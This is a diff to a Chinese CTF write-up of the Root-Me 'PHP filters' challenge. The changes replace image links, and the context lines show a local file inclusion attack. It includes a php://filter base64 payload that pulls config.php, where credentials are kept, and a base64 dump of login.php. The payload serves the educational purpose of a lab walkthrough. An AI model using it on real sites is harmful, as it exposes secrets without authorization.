@@ -12,8 +12,8 @@ PHP 的 LFI 漏洞，前置知识可以参考这篇文章： 【[Local File Incl
 - 点击 home 后，URL 会添加参数 `?inc=accueil.php`
 - 点击 login 后，URL 会添加参数 `?inc=login.php`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/6e33ef1692d033405ebe3b484be94747.png)
-![](http://exp-blog.com/wp-content/uploads/2019/03/a4262a891c35a88530b0b53e24e3e19a.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B20%5D%20%5B25P%5D%20PHP%20filters/imgs/01.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B20%5D%20%5B25P%5D%20PHP%20filters/imgs/02.png)
 
 这已经满足了 LFI 漏洞的特征。
 
@@ -37,7 +37,7 @@ PHP 的 LFI 漏洞，前置知识可以参考这篇文章： 【[Local File Incl
 PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4=
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/28daa024a2bddd6e80cf03f6a8860496.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B20%5D%20%5B25P%5D%20PHP%20filters/imgs/03.png)
 
 对其进行 Base64 解码，得到 login.php 的页面源码为：
 
@@ -82,7 +82,7 @@ if ( isset($_POST["username"]) && isset($_POST["password"]) ){
 
 `?inc=php://filter/convert.base64-encode/resource=config.php`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/f0c02d13a4fad9b3f06b849cf041c592.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B20%5D%20%5B25P%5D%20PHP%20filters/imgs/04.png)
 
 得到 config.php 的 Base64 编码内容为：
 
